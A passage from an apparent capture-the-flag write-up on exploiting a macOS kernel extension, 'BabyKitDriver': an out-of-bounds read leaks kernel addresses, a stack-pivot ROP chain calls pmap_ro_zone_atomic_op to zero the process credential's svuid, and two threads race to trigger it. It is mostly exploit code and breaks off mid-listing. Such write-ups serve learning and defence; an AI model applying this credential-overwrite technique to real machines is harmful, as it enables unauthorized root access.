</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Output:
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">0x02c0: 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">0x02d0: 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">0x02e0: 0x0000003000000008 0xffffff8b6ec53038
</span></span><span class="line"><span class="cl">0x02f0: 0x0000000000000000 0xffffff902edbec00
</span></span><span class="line"><span class="cl">0x0300: 0x0000000000000000 0xb0b60e9f717800b0
</span></span><span class="line"><span class="cl">0x0310: 0xffffffeb910f7a50 0xffffff7f9b3a5808
</span></span><span class="line"><span class="cl">0x0320: 0xffffff902edbec00 0x0000000000000000
</span></span><span class="line"><span class="cl">0x0330: 0xffffff902edbec00 0xffffff7f9b3a6ac0
</span></span><span class="line"><span class="cl">0x0340: 0xffffffeb910f7a70 0x000000002edbec00
</span></span><span class="line"><span class="cl">0x0350: 0xffffff902edbec00 0xffffff902edbecc0
</span></span><span class="line"><span class="cl">0x0360: 0xffffffeb910f7bb0 0xffffff8004d52d2e
</span></span><span class="line"><span class="cl">0x0370: 0xffffff800465aab4 0x0000000000000d0b
</span></span><span class="line"><span class="cl">0x0380: 0x0000000000000002 0x0000000000000000
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>From the output, we can see that we can get some leaks of the kernel addresses. We decided to use the data fetched from the <code>0x318</code> because this seems consistent enough to be used as a leaked address. Based on the GDB observation, this address has static offset from the <code>BabyKitDriver</code> address. Below is how we calculated the kernel address based on the leak.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">leaked</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mh">0x318</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">kext_base</span> <span class="o">=</span> <span class="n">leaked</span> <span class="o">-</span> <span class="mh">0x1808</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">slide</span> <span class="o">=</span> <span class="n">kext_base</span> <span class="o">-</span> <span class="nf">GetKextAddr</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0xdc000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">kbase</span> <span class="o">=</span> <span class="n">KERNEL_BASE_NO_SLID</span> <span class="o">+</span> <span class="n">slide</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kext Base       : 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kext_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kernel Text Base: 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kernel Slide    : 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">slide</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>GetKextAddr()</code> is our helper that we defined before, which will return the default address of the <code>BabyKitDriver</code>. With this OOB bug, we now know the base address of the kernel. Now, it&rsquo;s time to move to the next step, which is crafting our ROP Chain.</p>
<h4 id="crafting-rop-chain">Crafting ROP Chain</h4>
<p>Notes that in this step, we only craft and prepare our ROP Chain. We will use this later when we able to trigger the race.</p>
<p>Now that we have a leak, we need to think how should we craft our ROP Chain. Based on reading some writeups, usually the target in macOS local privilege escalation is we want to overwrite the <code>cred</code> struct.</p>
<p>First, let&rsquo;s recap what can we do if we trigger the race. We will make a call like below if we trigger the race:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">**</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">,</span> <span class="n">_QWORD</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">))(</span>
</span></span><span class="line"><span class="cl">        <span class="n">v10</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can overwrite the function with anything that we want, and upon observing in gdb:</p>
<ul>
<li><code>rsi</code> points to <code>chunk+0x10</code></li>
<li><code>rcx</code> points to <code>chunk</code></li>
</ul>
<p>By using this information, we need to put a good gadget in the <code>chunk+0x8</code> via race, so that we can perform ROP. One of the idea is we need to somehow pivot the stack to the <code>chunk</code>, because we can store our ROP Chain easily (with size limit up to <code>0x200</code> bytes).</p>
<p>Looking through the available gadgets on the <code>kernel</code>, we found some good gadgets, which are:</p>
<ul>
<li><code>push rcx ; out dx, eax ; jmp qword ptr [rsi + 0x66]</code></li>
<li><code>pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</code></li>
</ul>
<p>Now, if we overwrite the function pointer to the first gadget:</p>
<ul>
<li><code>push rcx ; out dx, eax ; jmp qword ptr [rsi + 0x66]</code> will push <code>chunk</code> address to top of our stack.</li>
<li><code>rsi</code> points to <code>chunk+0x10</code>, and we can control the content of <code>[rsi+0x66]</code>. If we set <code>rsi+0x66</code>, which is <code>chunk+0x76</code> to the <code>pop rsp</code> gadget, we will:
<ul>
<li>Pivot the stack to <code>chunk</code>, because the popped value to <code>rsp</code> is the <code>rcx</code> that we just pushed, which is <code>chunk</code>.</li>
<li>Pop 3 times, and our ROP chain will continue at <code>chunk+0x18</code>.</li>
</ul>
</li>
</ul>
<p>With this, we can setup our ROP first with <code>baby_leaveMessage</code>, so that the <code>chunk</code> will contain our ROP Chain.</p>
<p>Now, what should we do with the ROP Chain? There is already an old <a href="https://bazad.github.io/2016/05/mac-os-x-use-after-free/#elevating-privileges" target="_blank" rel="noopener noreffer ">writeup</a> that explain how to do it, which said that:</p>
<ul>
<li>There is <code>current_proc</code> function that can be called to fetch the current <code>proc</code></li>
<li>There is <code>proc_ucred</code> function, which will return the <a href="https://newosxbook.com/src.jl?tree=&amp;file=/xnu-10002.1.13/bsd/sys/ucred.h" target="_blank" rel="noopener noreffer ">ucred</a> of the current process if we pass the <code>proc</code> as its first argument.</li>
<li>After getting <code>ucred</code>, we basically just need to overwrite the <code>svuid</code> stored inside of it.</li>
<li>Then, we need to call <code>thread_exception_return</code> to get back to userland.</li>
</ul>
<p>However, there is a problem that we found later when we execute the ROP Chain following the above writeup. In this <code>kernel</code> version, the <code>ucred</code> resides in <code>read-only</code> area, which means if we try to overwrite the <code>svuid</code> value directly, we will crash. One of my teammate (sampriti) found out that the credential is allocated with a special <a href="https://newosxbook.com/src.jl?tree=&amp;file=/xnu-10002.1.13/doc/allocators/read-only.md" target="_blank" rel="noopener noreffer ">read-only allocator</a>, which is why it is in the <code>ro</code> area. Turns out, even though it resides in a <code>ro</code> area, we can still overwrite it with their allocator API. There is a function called <a href="https://newosxbook.com/src.jl?tree=xnu&amp;ver=10002.1.13&amp;file=osfmk/x86_64/pmap.c" target="_blank" rel="noopener noreffer ">pmap_ro_zone_atomic_op</a> which can be used to nullify the <code>cred-&gt;cr_svuid</code> by doing a call:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">pmap_ro_zone_atomic_op</span><span class="p">(</span><span class="n">ZONE_ID_KAUTH_CRED</span><span class="p">,</span> <span class="nf">proc_ucred</span><span class="p">(</span><span class="nf">current_proc</span><span class="p">()),</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">ZRO_ATOMIC_AND_32</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, below is the ROP Chain that we craft to do it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Gadgets
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define push_rcx_jmp_qword_ptr_rsi_plus_0x66 slide+0xffffff8000a984e1 </span><span class="c1">// push rcx ; out dx, eax ; jmp qword ptr [rsi + 0x66]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define pop_rcx slide+0xffffff800034fb88
</span></span></span><span class="line"><span class="cl"><span class="cp">#define mov_rdi_rax_pop_rbp_jmp_rcx slide+0xffffff8000364001
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ret slide+0xffffff8000335311
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_r14_r15 slide+0xffffff8000352176
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_rsp_r13_r14_r15 slide+0xffffff8000352173
</span></span></span><span class="line"><span class="cl"><span class="cp">#define mov_qword_rcx_rax_pop_rbp slide+0xffffff800037a86e </span><span class="c1">// mov qword ptr [rcx], rax ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define mov_rsi_rax_spoil_rax_pop_rbp_ret 0xffffff8000536392+slide  </span><span class="c1">// mov rsi, rax ; sub rax, rsi ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define pop_rdi 0xFFFFFF8000334E74+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_rdx 0xFFFFFF80006FF654+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_r8_eax_spoil 0xffffff80004db621+slide  </span><span class="c1">// pop r8 ; add eax, 0x5d000000 ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define add_rsi_rcx_mov_rax_rsi_pop_rbp 0xffffff80009ce25d+slide </span><span class="c1">// 0xffffff80009ce25d : add rsi, rcx ; mov rax, rsi ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define mov_dword_ptr_rsi_r8d_pop_rbp 0xffffff8000474e08+slide</span><span class="c1">// 0xffffff8000474e08 : mov dword ptr [rsi], r8d ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">    Build our ROP Chain
</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">chain</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">chain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Start at chunk+0x8 in driver. When the race is triggered,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// chunk+0x8 will be called, which will pivot the stack to this
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// chunk and do ROP Chain.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">push_rcx_jmp_qword_ptr_rsi_plus_0x66</span><span class="p">;</span> <span class="c1">// rsi+0x66 will contains gadget to pivot stack to this heap chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// chunk+0x10 won&#39;t be used
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Our ROP will start here after stack pivot with pop rsp; pop r13; pop r14; pop r15;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// , where popped rsp value will be chunk+0x0, so the ROP chain will start at chunk+0x18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// We will try to perform
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// pmap_ro_zone_atomic_op(ZONE_ID_KAUTH_CRED, proc_ucred(current_proc()), 0x20, ZRO_ATOMIC_AND_32, 0);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// , which will update the cred-&gt;cr_svuid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">current_proc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">proc_ucred</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_rdi_rax_pop_rbp_jmp_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// We will continue the ROP Chain at 0x80 just for convenience
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Need to do this because:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// - rsi points to chunk+0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// - there will be jmp qword ptr [rsi+0x66], which mean we need to put
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//   gadget in chunk+0x76 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// So what we do here is we reserve 0x10 bytes starting from chunk+0x70
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_r14_r15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Overwrite chunk+0x76 to pivot stack gadget
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">chunk_0x76</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x76</span> <span class="o">-</span> <span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chunk_0x76</span> <span class="o">=</span> <span class="n">pop_rsp_r13_r14_r15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Continue ROPChain
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// // Debugging purposes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// *chain++ = pop_rcx;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// *chain++ = addr_save_loc;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// *chain++ = mov_qword_rcx_rax_pop_rbp;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// *chain++ = 0x4141414141414141;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  
</span></span><span class="line"><span class="cl">  <span class="c1">// rax still contains the ucred (returned from proc_ucred)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Set rsi to ucred
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_rsi_rax_spoil_rax_pop_rbp_ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Set rdi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>   <span class="c1">// ZONE_ID_KAUTH_CRED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Set rdx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rdx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Set rcx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x34</span><span class="p">;</span>    <span class="c1">// ZRO_ATOMIC_AND_32
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Set r8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_r8_eax_spoil</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="c1">// Call pmap_ro_zone_atomic_op
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pmap_ro_zone_atomic_op</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Return to userland
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">thread_exception_return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is the ROP Chain to nullify the <code>svuid</code>, but this isn&rsquo;t enough. We will visit this again later during the race part.</p>
<h4 id="trigger-race">Trigger Race</h4>
<p>So, we need to trigger the race. How to do it, we just need to spawn two threads, where the first one is calling <code>leave_message(0,,)</code>, and the other one call <code>leave_message(1,,)</code> and <code>baby_read</code>. Below is the code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="nf">race</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">loop_end</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">leave_message</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ropChain</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">    Trigger Race Condition:
</span></span></span><span class="line"><span class="cl"><span class="cm">    - Create a new thread which will call leave_message(0, ropChain, 0x100);
</span></span></span><span class="line"><span class="cl"><span class="cm">    - In the mainthread, keep calling leave_message(1, ropChain+0x8, 0x200);
</span></span></span><span class="line"><span class="cl"><span class="cm">    - Race is success if:
</span></span></span><span class="line"><span class="cl"><span class="cm">      - chunk+0x98 is set to 1
</span></span></span><span class="line"><span class="cl"><span class="cm">      - yet, the chunk+0x8 is not output2, but the gadget that we write via leave_message(0) in the other thread
</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">pthread_t</span> <span class="n">th</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">th</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">race</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">test</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">test</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">loop_end</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">leave_message</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x8</span><span class="p">],</span> <span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">baby_read</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>  
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To recap, here is our current code so far:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
